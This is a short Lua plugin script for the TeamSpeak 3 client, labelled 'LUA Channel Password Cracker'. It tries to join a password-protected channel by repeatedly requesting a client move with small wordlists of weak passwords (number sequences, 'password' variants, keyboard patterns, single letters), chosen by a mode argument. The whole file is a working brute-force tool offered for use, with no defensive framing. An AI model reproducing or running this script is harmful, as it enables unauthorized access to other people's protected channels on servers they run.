require("ts3init")
require("ts3defs")
require("ts3errors")

local SCRIPT = "LUA Channel Password Cracker"
local SCRIPTSHORT = "CPC"
local VERSION = "0.1"
local AUTHOR = "Registrator"
local EMAIL = "piracy@teamspeakusa.com"

ColArray = { 'Green', 'darkgreen', 'Orange', 'darkorange', 'Red', 'darkred', 'Blue', 'darkblue' }
RANDCOL = ( ColArray[ math.random( #ColArray ) ] )
SCRIPT_PREFIX = "[color=grey][[/color][color="..RANDCOL.."]"..SCRIPTSHORT.."[/color][color=grey]][/color]"
local function ScriptLog(logMSG)
	if CC_DEBUG == true then
		local tsCol = { 'Green', 'Black', 'Red', 'Blue' }
		local RANDCOL = ( tsCol[ math.random( #tsCol ) ] )
		local scriptTimestamp = os.date("%x %X")
		ts3.printMessageToCurrentTab("[color=Black][[/color][color="..RANDCOL.."]"..scriptTimestamp.."[/color][color=Black]][/color]> "..SCRIPT_PREFIX..": "..logMSG)
	end
end
local function isempty(s)
  return s == nil or s == ''
end

function try(serverConnectionHandlerID, channelNumber, mode)
	local myClientID = ts3.getClientID(serverConnectionHandlerID)
	if not isempty(mode) then
		if mode == "num" then
			pwArray = { '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890' }
		elseif mode == "pw" then
			pwArray = { 'pw', 'PW', 'pwd', 'PWD', 'passwort', 'Passwort', 'password' , 'Password' }
		elseif mode == "def" then
			pwArray = { 'asdf', 'qwer', 'qwertz', '0', '00', '000', '.', ',', '1337' }
		elseif mode == "abc1" then
			pwArray = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'}
		elseif mode == "ABC1" then
			pwArray = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'}
		else
			ts3.printMessageToCurrentTab("Modes: num, pw, def, abc1, ABC1")
			return
		end
	else
		ts3.printMessageToCurrentTab("/lua run try {channelid} {num/pw/def/abc1/ABC1}")
		return
	end
	channelName = ts3.getChannelVariableAsString(serverConnectionHandlerID, channelNumber, 0)
	chatCol = ( ColArray[ math.random( #ColArray ) ] )
	PWCol = ( ColArray[ math.random( #ColArray ) ] )
	for i=1, #pwArray do
		ts3.printMessageToCurrentTab("[COLOR="..chatCol.."]"..i.."[/COLOR] > [color=black]Trying to crack PW of channel: \""..channelName.."\" #"..channelNumber..". Using Mode: "..mode.." and PW: [/color][COLOR="..PWCol.."]"..pwArray[i].."[/COLOR]")
		ts3.requestClientMove(serverConnectionHandlerID, myClientID, channelNumber, pwArray[i])
	end
end

ts3RegisterModule("pwcracker", registeredEvents)